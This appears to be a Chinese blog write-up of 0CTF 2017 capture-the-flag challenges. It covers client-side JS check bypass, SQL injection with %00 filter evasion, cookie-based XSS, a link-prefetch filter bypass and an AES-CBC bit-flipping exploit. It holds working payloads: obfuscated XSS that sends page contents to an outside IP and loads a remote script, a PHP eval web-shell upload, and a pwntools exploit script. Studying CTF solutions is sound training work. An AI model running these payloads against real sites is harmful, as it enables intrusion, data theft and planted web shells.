+<p style="max-width:100%;height:auto;">一道调试js的题,看了源码主要部分如下：</p>
+<pre><code class="js language-js" style="max-width:100%;height:auto;">function go()
+{
+    args = GetUrlParms();
+    if(args["id"]!=undefined)
+    {
+        var value = args["id"];
+        var ar = Module.main(value).split("|");
+        if(ar.length==3)
+        {
+            var s = "http://202.120.7.213:11181/api.php?id=" + args["id"] + "&amp;hash=" + ar[0] + "&amp;time=" + ar[1];
+            window.location.href=s;
+            $(document).ready(function(){
+              content=$.ajax({url:s, async:false});
+              $("#output").html(content.responseText);
+            });
+
+        }
+        if((ar.length==1)&amp;(ar[0]==&amp;apos;WrongBoy&amp;apos;))
+        {
+            alert(&amp;apos;Hello Hacker~&amp;apos;);
+        }
+    }
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">源码会根据我们输入调用<code style="max-width:100%;height:auto;">Module.main()</code>函数，如果我们输入有敏感字符，就会返回<code style="max-width:100%;height:auto;">wrongboy</code>，否则返回正常的格式，包括<code style="max-width:100%;height:auto;">hash</code>。
+也就是我们的核心目的就是要在我们非正常输入的情况下让它返回正常的格式然后进行相关操作。
+所以我们只需要开两个窗口，一个正常输入，一个非正常输入，然后借助浏览器的调试器进行调试js就可以了，开始用的火狐的，卡爆了，后来换成chrome就流畅了。之前<code style="max-width:100%;height:auto;">HCTF2016</code>也有类似的题。
+单步跟进之后到这里遇到第一个，<code style="max-width:100%;height:auto;">function.js</code>的7633行的<code style="max-width:100%;height:auto;">$13</code>变量，正常输入是true,敏感输入是false，
+<br/><img alt="" data-action="zoom" src="./0CTF2017-WEB-WriteUp/58cd05d64c2adc57ed000003.png" style="max-width:100%;height:auto;"/><br/>
+那直接修改源码赋为真值就可以了
+第二处在这个判断这里
+<br/><img alt="" data-action="zoom" src="./0CTF2017-WEB-WriteUp/58cd06ae4c2adc57ed000004.png" style="max-width:100%;height:auto;"/><br/>
+这个label的值，正确的时候是0,错的时候是12，即错误了就会进入这个if语句，那么我们直接把它改成<code style="max-width:100%;height:auto;">if(0)</code>就好了。
+之后就没有了，就能正常的注入了，不过由于同源策略的原因，异步请求交不过去，所以把源码改成如下</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;King of Glory Player List&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;script
+  src="https://code.jquery.com/jquery-3.1.1.min.js"
+  integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="
+  crossorigin="anonymous"&gt;&lt;/script&gt;
+&lt;script src="function1.js"&gt;&lt;/script&gt;
+&lt;script type="text/javascript"&gt;
+function GetUrlParms()
+{
+    var args=new Object();
+    var query=location.search.substring(1);
+    var pairs=query.split("&amp;");
+    for(var i=0;i&lt;pairs.length;i++)
+    {
+        var pos=pairs[i].indexOf(&amp;apos;=&amp;apos;);
+        if(pos==-1) continue;
+        var argname=pairs[i].substring(0,pos);
+        var value=pairs[i].substring(pos+1);
+        args[argname]=unescape(value);
+    }
+    return args;
+}
+function go()
+{
+    args = GetUrlParms();
+    if(args["id"]!=undefined)
+    {
+        var value = args["id"];
+        var ar = Module.main(value).split("|");
+        if(ar.length==3)
+        {
+            var s = "http://202.120.7.213:11181/api.php?id=" + args["id"] + "&amp;hash=" + ar[0] + "&amp;time=" + ar[1];
+            window.location.href=s;
+            $(document).ready(function(){
+              content=$.ajax({url:s, async:false});
+              $("#output").html(content.responseText);
+            });
+
+        }
+        if((ar.length==1)&amp;(ar[0]==&amp;apos;WrongBoy&amp;apos;))
+        {
+            alert(&amp;apos;Hello Hacker~&amp;apos;);
+        }
+    }
+}
+
+var wait = setInterval(function(){if(Module.main != undefined){clearInterval(wait);go();}}, 100);
+
+&lt;/script&gt;
+&lt;center&gt;&lt;h1&gt;King of Glory Player List&lt;/h1&gt;&lt;/center&gt;
+&lt;center&gt;&lt;div id="output"&gt;&lt;h2&gt;hmmmm&lt;/h2&gt;&lt;/div&gt;&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;"><code style="max-width:100%;height:auto;">function1.js</code>就是我们调整过得,接下来就能正常的发送请求了。</p>
+<p style="max-width:100%;height:auto;">发现服务端并没有再进行过滤了，然后由这个payload</p>
+<pre><code class="mysql language-mysql" style="max-width:100%;height:auto;">id=1 order by 2
+id=1 order by 3
+</code></pre>
+<p style="max-width:100%;height:auto;">确定是2列了。
+然后开始爆破
+爆的表名有<code style="max-width:100%;height:auto;">fl4g,user</code>
+<code style="max-width:100%;height:auto;">fl4g</code>列名就一个<code style="max-width:100%;height:auto;">hey</code>
+所以</p>
+<pre><code class="mysql language-mysql" style="max-width:100%;height:auto;">?id=1 and 1=2 union select 1,hey from fl4g
+</code></pre>
+<p style="max-width:100%;height:auto;">拿到flag。
+<br/><img alt="" data-action="zoom" src="./0CTF2017-WEB-WriteUp/58cd08764c2adc57ed000005.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="simplesqlin">simplesqlin</h2>
+<p style="max-width:100%;height:auto;">一听名字就大概知道是个sql注入，简单判断下是个数字注入
+然后试了试，同样通过orderby判断出有三列。
+然后发现select被过滤了，然后发现插入%00之后就能绕过</p>
+<pre><code class="mysql language-mysql" style="max-width:100%;height:auto;">id=1 and 1=2 union se%00lect 1,2,3
+</code></pre>
+<p style="max-width:100%;height:auto;">接下来有可以爆破了，之后的from和where都被过滤了。
+同样可以插入%00进行绕过，得到表名<code style="max-width:100%;height:auto;">flag,news</code>
+<code style="max-width:100%;height:auto;">flag</code>表的列名也是<code style="max-width:100%;height:auto;">flag</code>
+所以,payload如下：</p>
+<pre><code class="mysql language-mysql" style="max-width:100%;height:auto;">id=1 and 1=2 union s%00elect 1,flag,3 fro%00m flag
+</code></pre>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./0CTF2017-WEB-WriteUp/58cd0b024c2adc57ed000006.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="complicatedxss">complicated xss</h2>
+<p style="max-width:100%;height:auto;">这道题坑了我好久啊。。。
+爆破md5就不说了，遇见的次数已经太多了。直接主题
+首先是正常的xss点，说是让你访问<code style="max-width:100%;height:auto;">http://admin.government.vip:8000</code>就能拿到flag了，然后我们试图访问一下这个网页发现有个默认用户，登陆进去之后打印了用户名，即cookie里面<code style="max-width:100%;height:auto;">username</code>值，那我们的想法就是想办法伪造带标签的cookie，然后跳转过去之后就能执行标签页内容。
+另外需要注意的是
+<br/><img alt="" data-action="zoom" src="./0CTF2017-WEB-WriteUp/58cde12fc8d9b11b6e000000.png" style="max-width:100%;height:auto;"/><br/>
+在这个页面上述的函数都无法使用。</p>
+<p style="max-width:100%;height:auto;">然后我们开始尝试</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;script&gt;
+ function setCookie(name,value,seconds) {
+ seconds = seconds || 0; //seconds有值就直接赋值，没有为0，这个根php不一样。
+ var expires = "";
+ if (seconds != 0 ) { //设置cookie生存时间
+ var date = new Date();
+ date.setTime(date.getTime()+(seconds*1000));
+ expires = "; expires="+date.toGMTString();
+ }
+ document.cookie = name+"="+value+expires+";path=/;domain=.government.vip"; //转码并赋值
+
+}
+setCookie(&amp;apos;username&amp;apos;,String.fromCharCode(60,115,118,103,32,111,110,108,111,97,100,61,108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,58,47,47,49,48,52,46,49,54,48,46,52,51,46,49,53,52,58,49,50,51,52,53,47,63,97,61,39,43,101,115,99,97,112,101,40,100,111,99,117,109,101,110,116,46,98,111,100,121,46,105,110,110,101,114,72,84,77,76,41,62),1000);
+location.href=&amp;apos;http://admin.government.vip:8000/&amp;apos;;
+&lt;/script&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">通过这个代码我们成功跳转了过去并且拿到了返回值。
+结果目的网页的内容是一个上传表单如下：</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;p&gt;Upload your shell&lt;/p&gt;
+&lt;form action="/upload" method="post" enctype="multipart/form-data"&gt;
+&lt;p&gt;&lt;input type="file" name="file"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;input type="submit" value="upload"&gt;
+&lt;/p&gt;&lt;/form&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">也就是说我们还要在<code style="max-width:100%;height:auto;">http://admin.government.vip:8000</code>页面下执行post请求上传文件，构造了好久，最后还是觉得jquery好用啊。
+最后这里引入了iframe,然后利用<code style="max-width:100%;height:auto;">this.contentWindow</code>对象来绕过<code style="max-width:100%;height:auto;">eval</code>的执行。
+最后构造如下：</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;"> &lt;script&gt;
+ function setCookie(name, value, seconds) {
+ seconds = seconds || 0; //seconds有值就直接赋值，没有为0，这个根php不一样。
+ var expires = "";
+ if (seconds != 0 ) { //设置cookie生存时间
+ var date = new Date();
+ date.setTime(date.getTime()+(seconds*1000));
+ expires = "; expires="+date.toGMTString();
+ }
+ document.cookie = name+"="+value+expires+";path=/;domain=.government.vip"; //转码并赋值
+}
+setCookie(&amp;apos;username&amp;apos;,&amp;apos;&lt;iframe onload=this.contentWindow.eval(String.fromCharCode(118,97,114,32,98,100,119,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,115,99,114,105,112,116,34,41,59,98,100,119,46,115,114,99,61,34,104,116,116,112,58,47,47,119,119,119,46,98,101,110,100,97,119,97,110,103,46,115,105,116,101,58,56,48,48,48,47,109,121,106,115,47,117,112,108,111,97,100,95,97,106,97,120,46,106,115,34,59,100,111,99,117,109,101,110,116,46,104,101,97,100,46,97,112,112,101,110,100,67,104,105,108,100,40,98,100,119,41,59))&gt;&lt;/iframe&gt;&amp;apos;,1000)
+location.href=&amp;apos;http://admin.government.vip:8000/&amp;apos;;
+&lt;/script&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">中间那一串的<code style="max-width:100%;height:auto;">String.fromCharCode</code>就是</p>
+<pre><code class="js language-js" style="max-width:100%;height:auto;">var bdw=document.createElement("script");bdw.src="http://www.bendawang.site:8000/myjs/upload_ajax.js";document.head.appendChild(bdw);
+</code></pre>
+<p style="max-width:100%;height:auto;">然后在我的vps上我的<code style="max-width:100%;height:auto;">upload_ajax.js</code>如下：</p>
+<pre><code class="js language-js" style="max-width:100%;height:auto;">var t=document.getElementsByTagName("script")[0];
+var sss=document.createElement("script");
+sss.src="http://government.vip/static/jquery.min.js";
+document.head.insertBefore(sss,t);
+
+var body = "------WebKitFormBoundaryFikh4XTsUA3KuSES\r\n" +
+  "Content-Disposition: form-data; name=\"233\"\r\n" +
+  "\r\n" +
+  "eyJzY3JlZW5faGVpZ2h0Ijo4MjYsInNjcmVlbl93aWR0aCI6MTQ0MH0\r\n" +
+  "------WebKitFormBoundaryFikh4XTsUA3KuSES\r\n" +
+  "Content-Disposition: form-data; name=\"source_flag\"\r\n" +
+  "\r\n" +
+  "0\r\n" +
+  "------WebKitFormBoundaryFikh4XTsUA3KuSES\r\n" +
+  "Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n" +
+  "Content-Type: image/png\r\n" +
+  "\r\n" +
+  "GIF89a\x3c?php eval($_REQUEST[A]);?\x3e\x3c/script\x3e\r\n" +
+  "------WebKitFormBoundaryFikh4XTsUA3KuSES--\r\n";
+
+setTimeout("makeRequest()",1000)
+
+function makeRequest() {
+    var settings = {
+        type: "POST",
+        url:"http://admin.government.vip:8000/upload",
+        data:body,
+        success: function(data,textStatus) {
+            $.get(&amp;apos;http://104.160.43.154:12345?a=123+&amp;apos;+data);
+        },
+        headers: {
+            "Access-Control-Allow-Headers":"X-Requested-With",
+            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryFikh4XTsUA3KuSES",
+            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Accept-Language":"zh-CN,zh;q=0.8"
+        }
+    };
+    $.ajax(settings);
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">中间的延迟是为了让我创建的引入<code style="max-width:100%;height:auto;">jquery</code>的标签生效，这样<code style="max-width:100%;height:auto;">makeRequest</code>才能正常执行，最后这里要吐槽的是我用的火日大佬的xss平台，每次服务器给我的平台发请求，我的平台就崩了，导致最后只能使用nc监听端口，蓝瘦，下面是截图</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./0CTF2017-WEB-WriteUp/58cde2b5c8d9b11b6e000001.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="simplexss">simple xss</h2>
+<p style="max-width:100%;height:auto;">同样的套路，用md5和验证码防爆破，目的就是绕过过滤执行js拿回flag.php下数据
+然后好的就是这个可以测试
+经过一番fuzz之后发现一下重要符号被过滤</p>
+<pre><code style="max-width:100%;height:auto;">&amp;apos; " : / &gt; . ( ) &amp;  # , % ; ?等等
+</code></pre>
+<p style="max-width:100%;height:auto;">首先简单确认之后我们可以引入像是<code style="max-width:100%;height:auto;">script,img,svg,link</code>等关键标签。
+这么多过滤势必没办法直接执行语句访问flag.php，那么就想到要么引入我们自己的js，要么加载我们写的界面。然后要输入网址的话，既然说了是最新版本的chrome，就可以用<code style="max-width:100%;height:auto;">。</code>绕过<code style="max-width:100%;height:auto;">.</code>，然后就是用<code style="max-width:100%;height:auto;">\\</code>使得其用当前协议<code style="max-width:100%;height:auto;">https</code>访问链接，payload如下：</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;link rel=prefetch href=\\61dclub。com\x
+还有import，以及prerender应该也可以不过没有尝试，凡是预加载和预渲染已经直接调用理论上都可以
+</code></pre>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./0CTF2017-WEB-WriteUp/58ce593105e5ac4c79000000.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="cryptointegrity">crypto-integrity</h2>
+<p style="max-width:100%;height:auto;">首先拿到源代码如下：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">#!/usr/bin/python -u
+
+from Crypto.Cipher import AES
+from hashlib import md5
+from Crypto import Random
+from signal import alarm
+
+BS = 16
+pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
+unpad = lambda s : s[0:-ord(s[-1])]
+
+
+class Scheme:
+    def __init__(self,key):
+        self.key = key
+
+    def encrypt(self,raw):
+        raw = pad(raw)
+        raw = md5(raw).digest() + raw
+
+        iv = Random.new().read(BS)
+        cipher = AES.new(self.key,AES.MODE_CBC,iv)
+
+        return ( iv + cipher.encrypt(raw) ).encode("hex")
+
+    def decrypt(self,enc):
+        enc = enc.decode("hex")
+
+        iv = enc[:BS] ##前16位
+        enc = enc[BS:] ##之后
+
+        cipher = AES.new(self.key,AES.MODE_CBC,iv)
+        blob = cipher.decrypt(enc)
+
+        checksum = blob[:BS]
+        data = blob[BS:]
+
+        if md5(data).digest() == checksum:
+            return unpad(data)
+        else:
+            return
+
+key = Random.new().read(BS)
+scheme = Scheme(key)
+
+flag = open("flag",&amp;apos;r&amp;apos;).readline()
+alarm(30)
+
+print "Welcome to 0CTF encryption service!"
+while True:
+    print "Please [r]egister or [l]ogin"
+    cmd = raw_input()
+
+    if not cmd:
+        break
+
+    if cmd[0]==&amp;apos;r&amp;apos; :
+        name = raw_input().strip()
+
+        if(len(name) &gt; 32):
+            print "username too long!"
+            break
+        if pad(name) == pad("admin"):
+            print "You cannot use this name!"
+            break
+        else:
+            print "Here is your secret:"
+            print scheme.encrypt(name)
+
+
+    elif cmd[0]==&amp;apos;l&amp;apos;:
+        data = raw_input().strip()
+        name = scheme.decrypt(data)
+
+        if name == "admin":
+            print "Welcome admin!"
+            print flag
+        else:
+            print "Welcome %s!" % name
+    else:
+        print "Unknown cmd!"
+        break
+</code></pre>
+<p style="max-width:100%;height:auto;">初步想法是<code style="max-width:100%;height:auto;">padding oracle</code>，但是后来看到有个<code style="max-width:100%;height:auto;">alarm(30)</code>，只有30s的话就不可能是<code style="max-width:100%;height:auto;">padding oracle</code>了，因为就这个通信速度来看30s完全差得远。
+也就是说有别的解法了。
+然后想到hash长度扩展攻击的原理。
+这里有点类似的。
+比如我注册一个账户是<code style="max-width:100%;height:auto;">admin\0b\0b\0b\0b\0b\0b\0b\0b\0b\0b\0bbdw</code>
+然后服务端返回如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">f751a16eae391dd0f4dbfb5c4a740217  md5值
+14c63b729049860cb9905a2ae3d71807  admin\x0b\x0b...
+3f17049464bbc44f1bdccde9ea233d1f  bdw\x0d\x0d.....
+17ba7e5a78c1fa77811a0c72a519adea  \0x10\0x10......
+</code></pre>
+<p style="max-width:100%;height:auto;">然后我们想伪造的是</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">md5值
+admin\x0b\x0b...
+</code></pre>
+<p style="max-width:100%;height:auto;">也就简单了，我们只需要把第一次注册的MD5通过修改IV进行字节翻转成<code style="max-width:100%;height:auto;">admin\0b\0b\0b\0b\0b\0b\0b\0b\0b\0b\0b</code>的md5就可以了。
+所以代码如下：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">from pwn import *
+from hashlib import md5
+N=16
+def inject1(cipher):
+    print cipher
+    con.recvuntil("[l]ogin")
+    #con.interactive()
+    con.sendline(&amp;apos;l&amp;apos;)
+    con.sendline(cipher)
+    content=con.recvuntil("!")
+    print content
+    if "None" in content:
+        return 0
+    else:
+        return 1
+
+def xor(a, b):
+    return "".join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])
+
+pad = lambda s:s+(N-len(s)%N)*chr(N-len(s)%N)
+
+def padding_oracle(N,cipher):
+    get=""
+    for i in xrange(1,N+1):
+        for j in xrange(0,256):
+            padding=xor(get,chr(i)*(i-1))
+            c=chr(0)*(16-i)+chr(j)+padding+cipher
+            c=c.encode(&amp;apos;hex&amp;apos;)
+            print c
+            if inject1(c):
+                get=chr(j^i)+get
+                time.sleep(0.1)
+                break
+    return get
+
+con=remote(&amp;apos;202.120.7.217&amp;apos;,8221)
+con.recvuntil("[l]ogin")
+con.sendline(&amp;apos;r&amp;apos;)
+username=pad(&amp;apos;admin&amp;apos;)+&amp;apos;bdw&amp;apos;
+con.sendline(username)
+con.recvuntil("secret:")
+c=con.recvuntil("P")
+print c
+iv=c[1:-2].decode(&amp;apos;hex&amp;apos;)[:16]
+cipher=c[1:-2].decode(&amp;apos;hex&amp;apos;)[16:48]
+#middle=padding_oracle(N,cipher)
+plaintext=md5(pad(username)).digest()
+des=md5(pad("admin")).digest()
+tmp=xor(xor(iv,plaintext),des)
+inject1((tmp+cipher).encode(&amp;apos;hex&amp;apos;))
+con.interactive()
+</code></pre>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./0CTF2017-WEB-WriteUp/58cdfe55c8d9b11b6e000002.png" style="max-width:100%;height:auto;"/><br/></p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles godness">
+<aside>
+<div class="Bendawang" id="Bendawang" style="position:absolute;">
+<b id="Bendawang_toggle" style="cursor:pointer;" title="收起">目录[+]</b></div></aside></div>
+<div class="Bendawang_content" id="Bendawang_content"></div>
+
+<img class="yukino" id="yukino" src="./0CTF2017-WEB-WriteUp/41.png" style="position:absolute;"/>
+
+
+
+
+<footer>
+<div class="show-on-mobiles">
+<div style="display:inline-block">
+<div style="vertical-align:middle;">
+            Copyright©
+            <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder"><a href="http://bendawang.site/" style="font-size:16px">Bendawang</a></span>
+</div>
+</div>
+<div style="vertical-align:middle;">
+<span>Designed By</span>
+<a href="http://blog.csdn.net/qq_19876131"><img src="./0CTF2017-WEB-WriteUp/bendawang2.png"/></a>
+</div>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit one-third center-on-mobiles">
+<div class="copyright">
+          Copyright©
+          <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder">   <a href="http://bendawang.site/">Bendawang</a></span>
+</div>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>Designed By
+          <a href="http://blog.csdn.net/qq_19876131">
+<img src="./0CTF2017-WEB-WriteUp/bendawang2.png"/>
+</a>
+</p>
+</div>
+</div>
+</footer>
+<script src="./0CTF2017-WEB-WriteUp/prism.js"></script>
+<script src="./0CTF2017-WEB-WriteUp/zooming.js"></script>
+<script src="./0CTF2017-WEB-WriteUp/Bendawang.js"></script>
+
+
